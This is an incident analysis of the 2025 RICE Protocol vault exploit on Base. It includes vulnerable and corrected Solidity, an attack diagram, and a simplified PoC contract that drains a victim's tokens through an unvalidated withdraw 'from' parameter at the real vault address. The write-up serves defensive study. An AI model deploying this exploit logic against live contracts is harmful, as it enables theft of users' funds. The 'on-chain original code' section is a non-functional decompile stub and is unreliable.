# RICE Protocol — BentoBox Withdrawal Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-22 |
| **Protocol** | RICE Protocol |
| **Chain** | Base |
| **Loss** | ~34.5 WETH (~88,100 USD) |
| **Attacker** | [0x2a49c6fd18bd111d51c4fffa6559be1d950b8eff](https://basescan.org/address/0x2a49c6fd18bd111d51c4fffa6559be1d950b8eff) |
| **Attack Tx** | [0x8421c96c...](https://basescan.org/tx/0x8421c96c1cafa451e025c00706599ef82780bdc0db7d17b6263511a420e0cf20) |
| **Vulnerable Contract** | [0xcfe0de4a50c80b434092f87e106dfa40b71a5563](https://basescan.org/address/0xcfe0de4a50c80b434092f87e106dfa40b71a5563) |
| **Root Cause** | The `withdraw` function in the BentoBox-style vault allows draining another user's assets without validating the `from` address |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/RICE_exp.sol) |

---

## 1. Vulnerability Overview

RICE Protocol used a BentoBox-style contract (Sushi's asset management vault). The `withdraw(token, from, to, amount, share)` function did not verify that the `from` address matched the actual caller (`msg.sender`). The attacker gained authorization via `registerProtocol()` + `setMasterContractApproval()`, then set the `from` parameter of `withdraw()` to another user's address to drain that user's RICE tokens and WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable withdraw: no from address validation
contract BentoBoxLike {
    mapping(address => mapping(address => uint256)) public balanceOf; // user => token => amount

    function withdraw(
        address token_,
        address from,    // ❌ unvalidated from address
        address to,
        uint256 amount,
        uint256 share
    ) external {
        // ❌ no msg.sender == from check
        // ❌ no check that from has approved msg.sender

        uint256 shareAmount = toShare(token_, amount, false);
        balanceOf[from][token_] -= shareAmount;
        // transfer tokens to the to address
        IERC20(token_).transfer(to, amount);
    }
}

// ✅ Correct implementation
function withdraw(
    address token_,
    address from,
    address to,
    uint256 amount,
    uint256 share
) external {
    // ✅ caller validation
    require(
        from == msg.sender ||
        masterContractApproved[masterContractOf[msg.sender]][from],
        "Not approved"
    );
    // ...
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: RICE_decompiled.sol
contract RICE {
    function withdraw(uint256 a) external {  // ❌ vulnerability
        // TODO: decompile logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Call registerProtocol() on RICE BentoBox
  │         └─► Register attacker contract as a protocol
  │
  ├─[2]─► Call setMasterContractApproval()
  │         └─► Attacker gains access rights to other users' assets (vulnerability)
  │
  ├─[3]─► Call withdraw(RICE, victim, attacker, amount, 0)
  │         └─► ❌ from=victim but msg.sender=attacker
  │         └─► Drain victim's RICE/WETH balance
  │
  ├─[4]─► Swap stolen RICE for WETH on Uniswap V3
  │
  └─[5]─► Net profit: ~34.5 WETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    I0xcfE0 constant RICE_VAULT = I0xcfE0(0xcfe0de4a50c80b434092f87e106dfa40b71a5563);

    function start() public {
        // [1] Register as a protocol
        RICE_VAULT.registerProtocol();

        // [2] Obtain master contract approval (exploiting the vulnerability)
        RICE_VAULT.setMasterContractApproval(
            address(this), // user (attacker itself)
            address(this), // masterContract
            true,
            0, "", "" // passes without signature (weak validation)
        );

        // [3] Drain another user's RICE tokens
        RICE_VAULT.withdraw(
            RICE_TOKEN,
            VICTIM_ADDRESS,  // ❌ another user's address
            address(this),   // send to attacker
            VICTIM_BALANCE,
            0
        );

        // [4] Drain WETH in the same manner
        RICE_VAULT.withdraw(
            WETH_ADDR,
            VICTIM_ADDRESS,
            address(this),
            VICTIM_WETH_BALANCE,
            0
        );

        // [5] Swap RICE → WETH (Uniswap V3)
        ISwapRouter(UNISWAP_V3_ROUTER).exactInput(
            ISwapRouter.ExactInputParams({
                path: abi.encodePacked(RICE_TOKEN, uint24(3000), WETH_ADDR),
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: RICE_BALANCE,
                amountOutMinimum: 0
            })
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Authorization |
| **Attack Technique** | Draining another user's assets by manipulating the `from` parameter |
| **DASP Category** | Access Control |
| **CWE** | CWE-862: Missing Authorization |
| **Severity** | Critical |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Validate the `from` address**: The `withdraw()` function must verify `from == msg.sender` or an explicit approval.
2. **Strengthen the approval mechanism**: Use signature-based validation in `setMasterContractApproval()`.
3. **Audit BentoBox usage**: When adopting the BentoBox pattern, fully understand and apply all security logic from the original implementation.

## 7. Lessons Learned

- **Complexity of the BentoBox pattern**: When implementing complex vault patterns like BentoBox, every path through the authorization logic must be reviewed.
- **Never trust the `from` parameter unconditionally**: In a `withdraw(from, ...)` pattern, blindly trusting `from` allows an attacker to drain other users' assets.
- **Faithfully implement design patterns**: When borrowing a proven pattern like Sushi's BentoBox, its security logic must be implemented alongside it.